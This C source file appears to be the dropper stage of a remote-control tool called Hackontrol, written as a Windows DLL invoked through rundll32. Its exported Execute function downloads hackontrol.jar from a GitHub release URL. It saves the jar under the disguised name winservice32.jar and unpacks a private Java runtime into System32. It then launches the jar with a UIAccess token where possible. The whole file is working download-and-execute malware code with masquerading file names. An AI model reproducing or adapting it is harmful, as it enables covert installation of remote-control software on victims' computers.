#include <khopanwin32.h>
#include <khopanstring.h>
#include "extract.h"
#include "uiaccess.h"

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define FILE_JAVAW        L"javaw.exe"
#define FILE_LIBDLL32     L"libdll32.dll"
#define FILE_HACKONTROL   L"hackontrol.jar"
#define FILE_WINSERVICE32 L"winservice32.jar"
#define FOLDER_JAVA       L"jn"
#define FUNCTION_LIBDLL32 L"DownloadFile"
#define URL_HACKONTROL    L"https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/"

static BOOL DownloadJar(const LPWSTR pathFolderSystem32, const LPWSTR pathFileRundll32, const LPWSTR argumentFileRundll32);
static void ExecuteJarFile(const LPWSTR pathFileJavaw, const LPWSTR argumentFileJavaw, const LPWSTR pathFolderJavaBinary);

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();

	if(!pathFolderWindows) {
		KHWin32DialogErrorW(GetLastError(), L"KHGetWindowsDirectoryW");
		return;
	}
	
	LPWSTR pathFolderSystem32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32, pathFolderWindows);
	FREE(pathFolderWindows);

	if(!pathFolderSystem32) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return;
	}

	LPWSTR pathFileRundll32 = KHFormatMessageW(L"%ws\\" FILE_RUNDLL32, pathFolderSystem32);

	if(!pathFileRundll32) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freePathFolderSystem32;
	}

	if(!DownloadJar(pathFolderSystem32, pathFileRundll32, FILE_RUNDLL32 L" " FILE_LIBDLL32 L"," FUNCTION_LIBDLL32 L" " URL_HACKONTROL FILE_HACKONTROL L"," FILE_WINSERVICE32)) {
		goto freePathFileRundll32;
	}

	LPSTR pathFolderJava = KHFormatMessageA("%ws\\%ws", pathFolderSystem32, FOLDER_JAVA);

	if(!pathFolderJava) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freePathFileRundll32;
	}

	if(!CreateDirectoryA(pathFolderJava, NULL)) {
		DWORD error = GetLastError();

		if(error != ERROR_ALREADY_EXISTS) {
			KHWin32DialogErrorW(error, L"KHFormatMessageW");
			FREE(pathFolderJava);
			goto freePathFileRundll32;
		}
	}

	BOOL result = ExtractJRE(pathFolderJava);
	FREE(pathFolderJava);

	if(result) {
		goto freePathFileRundll32;
	}

	LPWSTR pathFolderJavaBinary = KHFormatMessageW(L"%ws\\" FOLDER_JAVA L"\\bin", pathFolderSystem32);

	if(!pathFolderJavaBinary) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freePathFileRundll32;
	}

	LPWSTR pathFileJavaw = KHFormatMessageW(L"%ws\\" FILE_JAVAW, pathFolderJavaBinary);

	if(!pathFileJavaw) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(pathFolderJavaBinary);
		goto freePathFileRundll32;
	}

	ExecuteJarFile(pathFileJavaw, FILE_JAVAW L" -jar ..\\..\\" FILE_WINSERVICE32, pathFolderJavaBinary);
	FREE(pathFileJavaw);
	FREE(pathFolderJavaBinary);
freePathFileRundll32:
	FREE(pathFileRundll32);
freePathFolderSystem32:
	FREE(pathFolderSystem32);
}

static BOOL DownloadJar(const LPWSTR pathFolderSystem32, const LPWSTR pathFileRundll32, const LPWSTR argumentFileRundll32) {
	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(startupInformation);
	PROCESS_INFORMATION processInformation;

	if(!CreateProcessW(pathFileRundll32, argumentFileRundll32, NULL, NULL, TRUE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, pathFolderSystem32, &startupInformation, &processInformation)) {
		KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
		return FALSE;
	}

	BOOL returnValue = FALSE;

	if(WaitForSingleObject(processInformation.hProcess, INFINITE) == WAIT_FAILED) {
		KHWin32DialogErrorW(GetLastError(), L"WaitForSingleObject");
		goto closeHandles;
	}

	returnValue = TRUE;
closeHandles:
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
	return returnValue;
}

static void ExecuteJarFile(const LPWSTR pathFileJavaw, const LPWSTR argumentFileJavaw, const LPWSTR pathFolderJavaBinary) {
	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(startupInformation);
	PROCESS_INFORMATION processInformation;
	HANDLE accessToken;

	if(!CreateUIAccessToken(&accessToken)) {
		accessToken = NULL;
	}

	if(accessToken) {
		if(!CreateProcessAsUserW(accessToken, pathFileJavaw, argumentFileJavaw, NULL, NULL, FALSE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, pathFolderJavaBinary, &startupInformation, &processInformation)) {
			KHWin32DialogErrorW(GetLastError(), L"CreateProcessAsUserW");
			return;
		}
	} else {
		if(!CreateProcessW(pathFileJavaw, argumentFileJavaw, NULL, NULL, TRUE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, pathFolderJavaBinary, &startupInformation, &processInformation)) {
			KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
			return;
		}
	}

	if(WaitForSingleObject(processInformation.hProcess, INFINITE) == WAIT_FAILED) {
		KHWin32DialogErrorW(GetLastError(), L"WaitForSingleObject");
	}

	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
}
